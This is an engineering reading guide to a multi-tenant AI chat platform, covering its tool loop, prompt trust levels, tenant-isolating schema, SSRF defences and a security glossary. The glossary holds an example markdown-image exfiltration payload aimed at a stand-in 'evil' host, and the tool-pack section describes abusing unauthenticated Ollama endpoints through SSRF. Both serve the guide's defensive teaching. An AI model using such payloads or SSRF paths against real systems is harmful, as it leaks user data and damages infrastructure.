# michi-chat: a reading guide

Written for someone who can read code fast and wants the *why*, not a tutorial. Five sections:
the overall flow, the database design, the code flow, the important files, and a glossary of
terms worth looking up.

---

## 1. Overall flow

Three processes, one browser.

```text
                    ┌──────────────────────────────────────────┐
  customer's site   │  Next.js app  (:3001)                    │
  or /t/<slug>  ────┤   /api/chat     public, CORS, embed key  │
                    │   /t/[slug]     the chat page            │
  operator ─────────┤   /admin        cookie session, no CORS  │
                    └───────┬──────────────────────┬───────────┘
                            │                      │
                   OpenAI SDK│              Drizzle │
                            ▼                      ▼
                    ┌───────────────┐      ┌────────────────┐
                    │ LiteLLM :4000 │      │ Postgres :5435 │
                    │ alias→provider│      │  pgvector img  │
                    └───────┬───────┘      └────────────────┘
                            ▼
                    Ollama on the WSL host :11434
```

**The one idea that explains the app.** The tool loop is a `for` loop that keeps appending to a
single array. No agent framework, no orchestrator, no state machine. A model "deciding" to call a
tool is nothing more than a response carrying `tool_calls` instead of `content`; your job is to
run them, append the results, and ask again.

```text
turn = [system, ...history, user]

round 0: → model     ← tool_calls[get_menu]      turn += assistant, turn += tool result
round 1: → model     ← tool_calls[get_weather]   turn += assistant, turn += tool result
round 2: → model     ← content "Try the..."      answer, break
```

**The second idea: three trust levels in one prompt.** Everything the model sees is one of:

| Level | What | Trust | Where it lives |
|---|---|---|---|
| L0 | platform preamble | fixed at compile time | `src/lib/prompt.ts` |
| L1 | tenant persona | operator-authored, semi-trusted | `tenants.persona` |
| L2 | tool results | fully untrusted third-party data | `role: "tool"` messages |

L2 never gets folded into the system prompt. That separation is the only structural defence
against a compromised upstream API injecting instructions, and it is worth understanding as a
general pattern rather than a detail of this app.

**The third idea: which layer owns what.** LiteLLM is a gateway, not a framework:

| Concern | Owner |
|---|---|
| Model routing, retries, budgets, spend | LiteLLM (`litellm/config.yaml`) |
| The agent loop, tenancy, RAG, evals, UI | this app |

The app knows only the strings `"michi"`, `"judge"` and `"embed"`. Swapping Ollama for OpenAI is
a config edit. That is why this rebuild is small: LiteLLM deleted the infrastructure half of the
.NET project.

### Why the gateway earns its container

Every provider has its own API, SDK, key format and parameter quirks. A gateway collapses that
to one dialect: the app's single LLM dependency is the plain OpenAI SDK pointed at
`http://litellm:4000`, and the yaml decides what each alias actually means. Four concrete
benefits, each already exercised in this repo:

1. **Provider swaps are config, not code.** `michi` = local qwen today, DashScope or OpenAI on
   launch day, by editing one line. No new SDK, no retesting the tool loop.
2. **The proxy absorbs provider quirks.** Worked example from the RAG build: the OpenAI SDK
   always sends `encoding_format` on embedding calls; Ollama supports neither value, and the
   SDK's base64 default came back garbled through the proxy. The fix was `drop_params: true` on
   the `embed` alias plus an explicit `encoding_format: "float"` from the app. Without the
   gateway, that translation would live in application code, once per provider quirk, forever.
3. **Aliases are indirection that features hang off.** `judge` exists so evals are graded by a
   *different* model than the one being judged; `tenants.model` makes per-tenant model tiers a DB
   column, not a code path. Both stay meaningful across any provider swap.
4. **It is the reason the rebuild fits in one reading.** The .NET predecessor spent half its code
   on provider routing, key management and budgets. LiteLLM *is* that half, off the shelf.

The honest caveat: with one provider and three aliases it is insurance, paid for with one extra
container. The payoff lands the first time providers are switched or mixed, which for a platform
promising per-tenant model choice is a when, not an if. (Onyx, the open-source knowledge
assistant, made the same bet: it runs LiteLLM internally.)

---

## 2. Database design

Nine tables. The interesting part is not the columns, it is **where isolation is enforced**.

```text
tenants ──┬──< api_keys           (public embed keys; secret keys hashed)
          ├──< widget_sessions    (server-issued visitor identity)
          ├──< conversations ──┐
          ├──< messages ───────┘   composite FK, see below
          ├──< kb_documents ───┐
          └──< kb_chunks ──────┘   same composite-FK pattern

admin_sessions   (operator; no users table, one password in env)
rate_buckets     (fixed-window counters, (key, window_start) PK)
```

### The composite foreign key

This is the highest value-per-line decision in the schema.

```sql
conversations  UNIQUE (tenant_id, id)          -- not redundant with the PK
messages       FOREIGN KEY (tenant_id, conversation_id)
                 REFERENCES conversations (tenant_id, id)
```

`messages.tenant_id` is denormalized: it is derivable through `conversation_id`, and it is stored
anyway. That redundancy is what lets the FK exist, and the FK means a message **physically
cannot** point at another tenant's conversation. Postgres rejects the write. No amount of
forgetting a `WHERE` clause in application code can produce a cross-tenant row.

`src/db/isolation.test.ts` asserts on the constraint *name* and SQLSTATE `23503`, so the test
proves *that specific mechanism* fired rather than merely that something threw.

### Three layers of isolation, and why the third is missing

1. **Composite FKs** — a guarantee, enforced by the database.
2. **`forTenant()`** in `src/db/tenant-db.ts` — a repository whose methods pre-apply the tenant
   predicate. The raw handle is deliberately named `dbRoot`, so an unscoped query looks wrong in
   a diff. This is ergonomics, not a guarantee.
3. **Row-Level Security** — deliberately *not* implemented, and the reason is the lesson:

   ```sql
   select usesuper from pg_user where usename = 'michi';  -- t
   ```

   Superusers bypass RLS unconditionally. `FORCE ROW LEVEL SECURITY` does not help. Policies
   written today would be **silently inert**, which is the most common way people ship "RLS" with
   zero protection. Doing it properly needs `CREATE ROLE michi_app NOSUPERUSER NOBYPASSRLS`, and
   every scoped query inside a transaction calling `set_config('app.tenant_id', …, true)` —
   because `postgres.js` pools connections, so a bare `SET` leaks to whichever request grabs that
   connection next, and `SET LOCAL` outside a transaction is a silent no-op.

### Why `messages` carries token and latency columns

`tokensIn`, `tokensOut`, `latencyMs`, `model`, `toolCalls` are recorded per message. That is what
powers the latency/token line in the UI, the whole `/admin/usage` screen, and eventually the eval
harness. LiteLLM's own spend logs attribute to a *virtual key*, which is coarser, and enabling
them requires giving LiteLLM a database it does not have. Per-message columns cost nothing and
are strictly more granular.

### The RAG tables, decided before they were built

Both decisions were written into `src/db/schema.ts` as a comment months before the tables
existed, because both are expensive to reverse:

- **`tenant_id` goes directly on `kb_chunks`**, not reached through `kb_documents`. Retrieval is
  `where tenant_id = $1 order by embedding <=> $2 limit k` — a leaf scan with no join to hang the
  filter on.
- **No ANN index at first.** pgvector's HNSW/IVFFlat **post-filter**: the index picks
  `ef_search` nearest rows *globally*, then applies `tenant_id`. A small tenant can get back
  fewer than `k` rows, or zero, while having plenty of relevant chunks. Silent quality collapse
  that only shows up for your smallest customer. An exact scan with a btree on `tenant_id` is
  correct and fast to roughly 50k chunks per tenant. Past that, pgvector 0.8.4 (already on the
  image) has `hnsw.iterative_scan`, which is the real fix.

Now that it is built, the shape to study in `src/lib/rag/`: chunking is heading-aware (the unit
of retrieval is a section, not a character window, with the heading breadcrumb embedded and
stored), ingestion embeds *before* touching the tables so a dead embedding service cannot leave
a document without chunks, and retrieval is the promised one-liner. Retrieval reaches the model
as a tool pack (`search_kb`) with a distance cutoff that returns "nothing found, say you do not
know" instead of the least-irrelevant chunk. Quality is measured, not assumed:
`npm run kb:eval` computes recall@k over `eval/kb-golden.json` (document-level, because chunk
boundaries move on every edit but "the hours question must hit the hours document" stays true).

### Migrations, not push

`drizzle-kit push` cannot express "add a NOT NULL column to a table that already has rows".
`drizzle/0001_tenants.sql` is the worked example: create `tenants`, seed one, add the column
nullable, backfill, `SET NOT NULL`, *then* add constraints. It also had to be reordered by hand,
because the generator emitted the composite FK before the `UNIQUE` it references.

---

## 3. Code flow

### A chat turn, in order

```text
POST /api/chat                                    src/app/api/chat/route.ts
 │
 ├─ resolveTenant(request)                        src/lib/tenant.ts
 │    ├─ X-Embed-Key → api_keys ⋈ tenants
 │    │    reject kind='secret'      ← a secret key must never work on a public route
 │    ├─ Origin ∈ tenant.allowedOrigins?
 │    ├─ per-IP and per-session rate windows      src/lib/rate-limit.ts
 │    └─ X-Michi-Session → widget_sessions, or mint a new one
 │
 ├─ validation, ALL of it before the stream       ← after you return a ReadableStream
 │    body ≤16KB · message ≤2000 chars              you have committed to a 200
 │    conversationId must look like a uuid
 │    daily cap:  userMessagesToday() < tenant.dailyMessageCap
 │
 ├─ conversation: findConversation(id, sessionId) scoped by (id, tenant, session)
 │  history:      recentMessages()                newest 12, reversed
 │  appendMessage(user)                           BEFORE the model call
 │
 ├─ buildSystemPrompt(tenant.persona)             src/lib/prompt.ts
 │  buildTenantTools(tenant.toolConfig)           src/lib/tools/index.ts
 │
 └─ new ReadableStream                            everything below is SSE
      emit status
      for round in 0..6:
        completion = openai.chat.completions.create({ model, messages: turn, tools })
        no tool_calls → answer, break
        else: emit tool {name,label} → execute → turn += wrapToolResult(result)
      fallback if answer is empty                 ← 6 tool rounds with no answer
      strip em/en dashes                          ← house style, enforced in code
      emit delta ×N  ·  appendMessage(assistant)  ·  emit done
```

Read `route.ts` top to bottom once. The shape to notice: **the pre-stream section is where every
recoverable failure lives**, because a `ReadableStream` response has already sent `200 OK`.

### The client side

`src/components/ChatPanel.tsx` uses `fetch` + `response.body.getReader()`, **not** `EventSource`
— EventSource cannot POST. So the SSE frame parser is hand-rolled: accumulate into a buffer,
split on `\n\n`, parse `event:` / `data:` lines. Roughly 30 lines that every streaming-chat
tutorial hides from you.

One field, `Turn.phase` (`thinking → answering → done | error`), drives all four visual states.
Tool chips feel live because the `tool` event is emitted *before* the tool runs.

### The admin side

Server Components throughout, with mutations as **Server Actions**. That choice is security, not
taste: Next gives actions built-in CSRF protection by comparing `Origin` against `Host`, and
route handlers get none.

The footgun worth internalising:

```tsx
// admin/layout.tsx — UX only. Does NOT protect actions.
if (!(await isAuthenticated())) redirect("/admin/login");

// actions.ts — the real guard, first line of EVERY mutation.
export async function saveTenantAction(...) {
  await requireAdmin();
```

Actions POST to the page route and execute *before* the layout re-renders, so a layout redirect
fires too late to stop the write.

### Why there is no `middleware.ts`

Not a style choice. Middleware runs on the **Edge runtime**, where the `postgres` driver (raw TCP
sockets) and `node:crypto` are both unavailable — so neither tenant resolution nor session
verification can live there. Static admin security headers go in `next.config.ts` instead.

### The tool packs

A tenant enables a code-defined pack and fills in parameters; the platform owns scheme, host and
port. Tenants never supply a raw URL. Two independent reasons:

- **SSRF.** From inside the app container, `http://<wsl-host>:11434/api/tags` returns 200 —
  unauthenticated Ollama, whose API includes `pull` (fill the disk), `delete` (destroy the model
  the platform runs on) and `generate` (free inference bypassing every quota). Also reachable:
  `db:5432`, `litellm:4000`, and the app itself. Doing arbitrary URLs safely means resolving DNS
  yourself and connecting to the *pinned IP* through a custom undici dispatcher, or DNS rebinding
  walks straight through your validator.
- **Projection.** Each pack trims its response to a handful of fields, because a tool result is
  re-sent on *every* round. `get_menu` flattens the CMS's `{iv: value}` envelopes, drops inactive
  rows and dedupes duplicates. A generic executor cannot express that without a projection
  mini-language, and the raw payload would blow a 4B model's context window.

`ToolPack.configFields` drives the admin form, so **adding a pack file grows the UI by itself**.

---

## 4. Important files

Read in this order; each depends only on what came before.

| File | Why it matters |
|---|---|
| `src/lib/prompt.ts` | Smallest file, biggest idea: the three trust levels, delimiter escaping, byte caps |
| `src/lib/tools/registry.ts` | The pack interface, and a long comment on why there is no generic HTTP tool |
| `src/lib/tools/mugshot.ts` | Three real executors. Note the projection and the CMS quirks |
| `src/lib/tools/index.ts` | Turns `toolConfig` into definitions + labels + one executor |
| `src/db/schema.ts` | Nine tables. The composite FK is the thing to study; kb_chunks repeats it |
| `src/db/tenant-db.ts` | `forTenant()`, and a comment on why RLS is absent |
| `src/lib/rag/chunk.ts` | Heading-aware chunking, dependency-free and deterministic on purpose |
| `src/lib/rag/index.ts` | Ingestion (embed before write) and the leaf-scan retrieval |
| `src/lib/slack.ts` | The one tenant URL in the system, and the pin that makes it safe |
| `src/lib/tenant.ts` | Embed key → tenant, origin allowlist, sessions, CORS helpers |
| `src/app/api/chat/route.ts` | The whole backend of a turn. Read last, once the pieces make sense |
| `src/components/ChatPanel.tsx` | Hand-rolled SSE parsing; one `phase` field drives the UI |
| `src/app/admin/actions.ts` | Every mutation, each opening with `requireAdmin()` |
| `src/lib/admin-auth.ts` | scrypt, timing-safe compare, revocable sessions, no library |
| `drizzle/0001_tenants.sql` | The hand-edited backfill. Read the header comment |

Skim only: `admin/*/page.tsx` (plain server components), `globals.css`, `admin.css`.

---

## 5. Terms worth looking up

Grouped by where they bite. You will know most; the value is in the specific gotcha attached.

**Multi-tenancy**
- *composite foreign key* / *denormalized tenant key* — the guarantee in this schema
- *Row-Level Security*, `BYPASSRLS`, `FORCE ROW LEVEL SECURITY`, `set_config(…, true)` — and
  why a superuser makes all of it inert
- *noisy neighbour*, *per-tenant quota*, *fixed window vs token bucket*

**Web security**
- *SSRF*, **DNS rebinding**, *TOCTOU*, undici `Agent` with a custom `lookup` — why hostname
  allowlists alone do not work
- *CORS preflight*, `Vary: Origin`, why `Access-Control-Allow-Origin: *` and
  `credentials: 'include'` are mutually exclusive, *open reflector*
- `SameSite=None; Secure`, *CHIPS* / partitioned cookies, *third-party cookie deprecation* — why
  this app uses a bearer token in partitioned `localStorage` instead
- *CSRF*, *double-submit token*, Server Actions' built-in Origin check
- *zero-click exfiltration via markdown images* — `skipHtml` does not stop `![](https://evil/?c=…)`
- `scrypt` vs `bcrypt` vs `argon2`, `timingSafeEqual`, why you hash both sides first

**LLM engineering**
- *tool calling* / *function calling*, the `role: "tool"` message, `tool_call_id`
- *prompt injection*, **indirect prompt injection** (via tool results), *delimiter escaping*,
  *instruction hierarchy*
- *context window* vs *token budget* — and why tool results are re-sent every round
- *SSE*, why `EventSource` cannot POST, `X-Accel-Buffering: no`
- *LLM gateway* (LiteLLM), *virtual keys*, *model aliasing*

**RAG, now built**
- *heading-aware chunking*, *embedding dimensions*, *cosine distance* (`<=>`) — and operator
  precedence: `${expr}::float8` in a SQL template casts the *parameter*, not the result
- *HNSW*, *IVFFlat*, `ef_search`, **post-filtering vs pre-filtering**, `hnsw.iterative_scan`
- *recall@k*, *golden set*, *LLM-as-judge* (and why the judge is a different model)
- `encoding_format` and `drop_params` — the embedding-quirk story in section 1

**Postgres and Drizzle**
- `drizzle-kit generate` vs `push`, `__drizzle_migrations`, *baselining*
- adding `NOT NULL` to a populated table; `ON DELETE CASCADE` blast radius
- `on conflict … do update … returning` as an atomic counter
- `jsonb` is untyped at runtime: Drizzle's `$type<>()` is a compile-time assertion, not validation

**Next.js App Router**
- Server Components vs Client Components, `useActionState`
- Server Actions and their CSRF protection; **why a layout guard does not protect them**
- Edge runtime limits in `middleware.ts` (no TCP sockets, no `node:crypto`)
- route handlers have **no** body size limit (`bodyParser.sizeLimit` is Pages Router only)

---

## What is deliberately unfinished

- **`delta` is not real streaming.** The answer is fetched whole, then sliced into 48-char chunks.
  Wiring `stream: true` through a tool loop is genuinely instructive: you must buffer enough of
  each round to tell a tool call from an answer.
- **RLS**, pending a `NOSUPERUSER` role.
- **The answers eval and the widget embed** — the roadmap in `CLAUDE.md`. RAG shipped with a
  *retrieval* eval (recall@k); grading *answers* needs the golden set + the `judge` alias, and
  is the next item. The kb/mugshot documents are placeholders until real facts replace them.
- **LiteLLM's own database**, and with it virtual keys and budgets. Deferred because spend is
  genuinely $0 on local Ollama. The trigger to revisit is written down: the day
  `litellm/config.yaml` points at a paid provider, virtual keys buy a hard budget ceiling
  enforced upstream of your own code.
